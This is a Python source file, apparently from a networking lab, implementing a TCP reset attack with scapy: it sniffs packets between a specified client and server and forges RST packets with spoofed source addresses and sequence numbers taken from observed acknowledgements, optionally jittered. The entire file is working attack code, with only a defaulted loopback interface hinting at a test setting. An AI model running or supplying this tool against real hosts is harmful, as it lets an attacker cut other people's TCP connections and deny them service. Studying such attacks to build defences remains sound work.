import logging.config
import sys
import random

import scapy.config
from scapy.packet import Packet
from scapy.layers.inet import IP
from scapy.layers.inet import TCP
from scapy.supersocket import L3RawSocket
from scapy.sendrecv import send, sniff

logging.config.fileConfig('tcp_ip_attack/logger_config.ini', disable_existing_loggers=False)
logger = logging.getLogger(__name__)


class TrafficSniffer:
    scapy.config.conf.L3socket = L3RawSocket
    DefaultWindowSize = 2052

    def __init__(self, server_ip: str, server_port: str, client_ip: str,
                 sequence_jitter: int = 0, interface: str = 'lo') -> None:
        self.client_ip: str = client_ip
        self.server_ip: str = server_ip
        self.server_port: int = int(server_port)
        self.sequence_jitter: int = sequence_jitter
        self.interface: str = interface

    @staticmethod
    def _make_message(source_ip: str, source_port: int,
                      destination_ip: str, destination_port: int,
                      sequence_number: int, acknowledge_number: int, flags: str) -> str:
        return f'''Source ip: {source_ip}
Source port: {source_port}
Destination ip: {destination_ip}
Destination port: {destination_port}
Sequence number: {sequence_number}
Acknowledge number: {acknowledge_number}
Flags: {flags}
'''

    def _check_packet_belongs_connection(self, packet: Packet) -> bool:
        return self._check_packet_server_to_client(packet) or self._check_packet_client_to_server(packet)

    def _check_packet_server_to_client(self, packet: Packet) -> bool:
        if packet.haslayer(TCP):
            source_ip = packet[IP].src
            source_port = packet[TCP].sport
            destination_ip = packet[IP].dst
            return source_ip == self.server_ip and source_port == self.server_port and destination_ip == self.client_ip
        else:
            return False

    def _check_packet_client_to_server(self, packet: Packet) -> bool:
        if packet.haslayer(TCP):
            source_ip = packet[IP].src
            destination_ip = packet[IP].dst
            destination_port = packet[TCP].dport
            return source_ip == self.client_ip and destination_ip == self.server_ip and destination_port == self.server_port
        else:
            return False

    def _send_reset(self, packet: Packet) -> None:
        source_ip = packet[IP].src
        source_port = packet[TCP].sport

        destination_ip = packet[IP].dst
        destination_port = packet[TCP].dport

        sequence_number = packet[TCP].seq
        acknowledge_number = packet[TCP].ack
        flags = packet[TCP].flags

        message = self._make_message(source_ip, source_port, destination_ip, destination_port, sequence_number, acknowledge_number, flags)
        logger.info(f'Captured message \n ------ \n {message} \n ------ ')

        if 'S' in flags:
            logger.warning('Packet has SYN flag, not sending RST')
            return

        jitter = random.randint(max(-self.sequence_jitter, -sequence_number), self.sequence_jitter)
        if jitter == 0:
            logger.info('This RST packet should close connection')

        reset_attack_sequence_number = acknowledge_number + jitter
        reset_packet = IP(src=destination_ip, dst=source_ip) / TCP(sport=destination_port, dport=source_port, flags='R',
                                                                   window=self.DefaultWindowSize,
                                                                   seq=reset_attack_sequence_number)
        send(reset_packet, verbose=0, iface=self.interface)

    @staticmethod
    def _show_packet(packet: Packet) -> str:
        return packet.show()

    def _launch(self, callback):
        logger.info('Start traffic sniffer')
        sniff(iface=self.interface, count=50, prn=callback, lfilter=self._check_packet_belongs_connection)
        logger.info('End traffic sniffer')

    def launch_traffic_sniffing(self) -> None:
        self._launch(self._show_packet)

    def launch_reset_attack(self) -> None:
        self._launch(self._send_reset)


def main():
    if len(sys.argv) == 4:
        sniffer = TrafficSniffer(*sys.argv[1:])
        sniffer.launch_reset_attack()
    else:
        print('Wrong usage', file=sys.stderr)


if __name__ == '__main__':
    main()
